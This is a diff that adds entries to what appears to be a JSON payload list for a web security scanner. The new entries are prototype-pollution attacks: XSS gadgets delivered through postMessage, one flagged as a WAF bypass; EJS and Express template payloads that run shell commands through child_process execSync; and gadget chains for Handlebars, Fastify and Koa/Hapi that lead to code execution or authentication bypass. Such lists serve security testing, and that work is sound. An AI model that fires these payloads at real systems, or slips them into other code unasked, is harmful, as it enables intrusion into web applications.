@@ -36,7 +36,29 @@
       "description": "Prototype pollution via window.postMessage cross-origin messaging",
       "payloads": [
         {"payload": "JSON.parse('{\"__proto__\":{\"polluted\":\"canary\"}}')", "description": "JSON merge via postMessage — exploits message handlers that merge received data", "waf_bypass": false},
-        {"payload": "{\"type\":\"config\",\"data\":{\"__proto__\":{\"isAdmin\":true}}}", "description": "Config message pollution — targets handlers that merge config/settings objects", "waf_bypass": false}
+        {"payload": "{\"type\":\"config\",\"data\":{\"__proto__\":{\"isAdmin\":true}}}", "description": "Config message pollution — targets handlers that merge config/settings objects", "waf_bypass": false},
+        {"payload": "{\"type\":\"update\",\"__proto__\":{\"src\":\"data:,alert(1)\"}}", "description": "Script src gadget via postMessage — targets handlers that create script elements from message data", "waf_bypass": false},
+        {"payload": "{\"__proto__\":{\"innerHTML\":\"<img src=x onerror=alert(1)>\"}}", "description": "innerHTML gadget via postMessage — exploits code that sets innerHTML from polluted property", "waf_bypass": false},
+        {"payload": "{\"__proto__\":{\"href\":\"javascript:alert(1)\"}}", "description": "Origin bypass via href pollution — exploits postMessage handlers that check origin from object property", "waf_bypass": true}
+      ]
+    },
+    "ejs_rce": {
+      "description": "EJS template engine RCE via prototype pollution — pollute rendering options to inject code",
+      "payloads": [
+        {"payload": "{\"__proto__\":{\"outputFunctionName\":\"x;require('child_process').execSync('id');s\"}}", "description": "EJS outputFunctionName RCE — injects code via template compilation option, executes during render()", "waf_bypass": false},
+        {"payload": "{\"__proto__\":{\"escapeFunction\":\"1;return global.process.mainModule.require('child_process').execSync('id').toString()\"}}", "description": "EJS escapeFunction RCE — overrides escape function to execute arbitrary code", "waf_bypass": false},
+        {"payload": "{\"__proto__\":{\"client\":true,\"escape\":\"1;return global.process.mainModule.require('child_process').execSync('id')\"}}", "description": "EJS client mode RCE — enables client mode and overrides escape for code execution", "waf_bypass": false},
+        {"payload": "{\"__proto__\":{\"view options\":{\"outputFunctionName\":\"x;require('child_process').execSync('id');s\"}}}", "description": "Express view options pollution — targets Express apps using EJS via settings object", "waf_bypass": false}
+      ]
+    },
+    "gadget_discovery": {
+      "description": "Framework-specific prototype pollution gadgets for privilege escalation and RCE in Node.js frameworks",
+      "payloads": [
+        {"payload": "{\"__proto__\":{\"env\":{\"NODE_OPTIONS\":\"--require /proc/self/environ\"}}}", "description": "Express env gadget — pollutes process environment to load malicious module on child_process spawn", "waf_bypass": false},
+        {"payload": "{\"__proto__\":{\"handlebars\":{\"compilerOptions\":{\"knownHelpersOnly\":false}}}}", "description": "Express Handlebars gadget — disables known helpers restriction to enable SSTI in templates", "waf_bypass": false},
+        {"payload": "{\"__proto__\":{\"allowProtoPropertiesByDefault\":true,\"allowProtoMethodsByDefault\":true}}", "description": "Handlebars prototype access gadget — re-enables __proto__ access in Handlebars 4.6+ templates", "waf_bypass": false},
+        {"payload": "{\"constructor\":{\"prototype\":{\"reply\":{\"decorators\":{\"constructor\":{\"prototype\":{\"bind\":{\"constructor\":{\"prototype\":{\"code\":\"return process.mainModule.require('child_process').execSync('id').toString()\"}}}}}}}}}}}", "description": "Fastify reply decorator gadget — deep pollution chain targeting Fastify reply decoration system", "waf_bypass": false},
+        {"payload": "{\"__proto__\":{\"auth\":{\"strategy\":\"bypass\"},\"isAuthenticated\":true}}", "description": "Koa/Hapi auth bypass gadget — pollutes authentication state checked by auth middleware", "waf_bypass": false}
       ]
     }
   }
